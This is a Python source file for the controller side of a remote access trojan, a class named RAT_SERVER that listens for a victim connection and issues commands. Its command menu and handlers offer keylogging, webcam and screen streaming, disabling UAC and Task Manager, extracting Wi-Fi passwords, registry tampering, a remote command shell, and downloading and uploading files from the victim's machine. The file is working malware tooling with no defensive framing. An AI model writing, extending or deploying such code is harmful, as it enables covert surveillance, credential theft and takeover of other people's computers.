import random
import socket
import os
from vidstream import StreamingServer

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = None
        self.addr = None
        self.s = None
        self.server = None

    def build_connection(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.host, self.port))
        self.s.listen(5)
        print("[*] Waiting for the client...")
        self.client, self.addr = self.s.accept()
        ipcli = self.client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")

    def start_streaming_server(self):
        try:
            self.server = StreamingServer(self.host, 8080)
            self.server.start_server()
        except ImportError:
            print("StreamingServer module not found...")

    def stop_streaming_server(self):
        if self.server:
            self.server.stop_server()

    def send_command_and_receive(self, command):
        self.client.send(command.encode())
        return self.client.recv(1024).decode()

    def banner(self):
        commands = {
            "System": [
                "help                      all commands available",
                "writein <text>            write the text to current opened window",
                "browser                   enter query to browser",
                "turnoffmon                turn off the monitor",
                "turnonmon                 turn on the monitor",
                "reboot                    reboot the system",
                "drivers                   all drivers of PC",
                "kill                      kill the system task",
                "sendmessage               send messagebox with the text",
                "cpu_cores                 number of CPU cores",
                "systeminfo (extended)     all basic info about system (via cmd)",
                "tasklist                  all system tasks",
                "localtime                 current system time",
                "curpid                    PID of client's process",
                "sysinfo (shrinked)        basic info about system (Powers of Python)",
                "shutdown                  shutdown client's PC",
                "isuseradmin               check if user is admin",
                "extendrights              extend system rights",
                "disabletaskmgr            disable Task Manager",
                "enabletaskmgr             enable Task Manager",
                "disableUAC                disable UAC",
                "monitors                  get all used monitors",
                "geolocate                 get location of computer",
                "volumeup                  increase system volume to 100%",
                "volumedown                decrease system volume to 0%",
                "setvalue                  set value in registry",
                "delkey                    delete key in registry",
                "createkey                 create key in registry",
                "setwallpaper              set wallpaper",
                "exit                      terminate the session of RAT"
            ],
            "Shell": [
                "pwd                       get current working directory",
                "shell                     execute commands via cmd",
                "cd                        change directory",
                "[Driver]:                 change current driver",
                "cd ..                     change directory back",
                "dir                       get all files of current directory",
                "abspath                   get absolute path of files"
            ],
            "Network": [
                "ipconfig                  local ip",
                "portscan                  port scanner",
                "profiles                  network profiles",
                "profilepswd               password for profile"
            ],
            "Input devices": [
                "keyscan_start             start keylogger",
                "send_logs                 send captured keystrokes",
                "stop_keylogger            stop keylogger",
                "disable(--keyboard/--mouse/--all) ",
                "enable(--keyboard/--mouse/--all)"
            ],
            "Video": [
                "screenshare               overseeing remote PC",
                "webcam                    webcam video capture",
                "breakstream               break webcam/screenshare stream",
                "screenshot                capture screenshot",
                "webcam_snap               capture webcam photo"
            ],
            "Files": [
                "delfile <file>            delete file",
                "editfile <file> <text>    edit file",
                "createfile <file>         create file",
                "download <file> <homedir> download file",
                "upload                    upload file",
                "cp <file1> <file2>        copy file",
                "mv <file> <path>          move file",
                "searchfile <file> <dir>   search for file in mentioned directory",
                "mkdir <dirname>           make directory",
                "rmdir <dirname>           remove directory",
                "startfile <file>          start file",
                "readfile <file>           read from file"
            ]
        }

        for section, cmds in commands.items():
            print(f"======================================================")
            print(f"{section}: ")
            print(f"======================================================")
            for cmd in cmds:
                print(cmd)
            print(f"======================================================")

    def execute_command(self, command):
        if command == 'shell':
            self.client.send(command.encode())
            while True:
                shell_command = str(input('>> '))
                self.client.send(shell_command.encode())
                if shell_command.lower() == 'exit':
                    break
                result_output = self.client.recv(1024).decode()
                print(result_output)
        elif command == 'screenshare' or command == 'webcam':
            self.client.send(command.encode("utf-8"))
            self.start_streaming_server()
        elif command == 'breakstream':
            self.stop_streaming_server()
        elif command.startswith('download'):
            try:
                self.client.send(command.encode())
                file_data = self.client.recv(2147483647)
                file_path = command.split(" ")[2]
                with open(file_path, 'wb') as file:
                    file.write(file_data)
                print("File is downloaded")
            except IndexError:
                print("Not enough arguments")
        elif command == 'upload':
            self.client.send(command.encode())
            file_path = str(input("Enter the filepath to the file: "))
            out_file_path = str(input("Enter the filepath to outgoing file (with filename and extension): "))
            with open(file_path, 'rb') as file:
                file_data = file.read(2147483647)
            self.client.send(out_file_path.encode())
            self.client.send(file_data)
            print("File has been sent")
        elif command == 'exit':
            self.client.send(command.encode())
            output = self.client.recv(1024).decode()
            print(output)
            self.s.close()
            self.client.close()
        else:
            self.send_command_and_receive(command)

    def execute(self):
        self.banner()
        while True:
            command = input('Command >>  ')
            self.execute_command(command)

if __name__ == '__main__':
    rat = RAT_SERVER('127.0.0.1', 4444)
    rat.build_connection()
    rat.execute()
